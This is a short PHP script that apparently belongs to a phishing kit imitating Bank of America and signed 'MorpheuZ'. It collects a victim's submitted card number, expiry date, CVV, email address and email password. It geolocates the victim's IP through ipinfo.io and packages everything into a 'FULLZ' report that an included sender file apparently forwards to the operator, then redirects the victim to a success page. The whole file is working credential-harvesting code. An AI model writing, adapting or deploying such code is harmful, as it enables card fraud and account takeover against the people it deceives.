<?php

session_start();
$ip = $_SERVER['REMOTE_ADDR'];
$time = date("m-d-Y g:i:a");
$details = json_decode(file_get_contents("http://ipinfo.io/{$ip}"));
$country = $details->country;
$state = $details->region;
$city = $details->city;
$browser = $_SERVER['HTTP_USER_AGENT'];

$msg = "==============[ FULLZ Inc...2 ]=============================\n";
$msg .= "B.O.A's By MorpheuZ\n";
$msg .= "==============[Card Details ]==========================\n";
$msg .= "Card Number : ".$_POST['Cnumber']."\n";
$msg .= "Month : ".$_POST['b1']."\n";
$msg .= "Year : ".$_POST['b3']."\n";
$msg .= "CW : ".$_POST['cWW']."\n";
$msg .= "===============[ Email Info ]============================\n";
$msg .= "Email : ".$_POST['emll']."\n";
$msg .= "Password : ".$_POST['pswd']."\n";
$msg .= "==========================================================\n";
$msg .= "Sent from $ip on $time\n";
$msg .= "Country: '$country' | State: '$state' | City: '$city'\n";
$msg .= "USER-WEB-BROWSER: '$browser'\n";
$msg .= "===============[ MorpheuZ Inc.]=============================\n";
include("mp3/SenMe.php");

  {
		   header("Location: Successfull.php");

	   }
?>
